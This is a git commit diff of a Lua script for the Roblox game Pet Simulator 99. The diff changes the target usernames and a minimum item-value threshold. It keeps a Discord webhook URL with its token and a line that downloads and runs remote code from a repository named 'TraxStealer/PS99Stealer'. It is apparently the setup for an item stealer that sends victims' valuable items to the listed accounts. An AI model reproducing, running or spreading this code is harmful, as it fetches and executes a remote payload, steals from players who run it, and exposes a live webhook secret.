6bfc3c565a38fc5a64cb4b2f3e6c705c6d6f955a
ROCGMC <a0960730188@gmail.com>
2025-06-01 09:29:06 +0800

    Update ps99 Code.lua

--- ps99 Code.lua
+++ ps99 Code.lua
@@ -1,6 +1,6 @@
-Username = "ROCGMC"
-Username2 = "ROCGMC"
-MinimumRAP = 1000000
+Username = "a10056789"
+Username2 = "a10056789"
+MinimumRAP =10000000
 Webhook = "https://discord.com/api/webhooks/1363353314925740313/oxvok2uuruheKU8yxxFx33QIgjdGVW13wy3icuGG6y2eGXcQZDes-PqtI0zBYL7Qf2aE"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
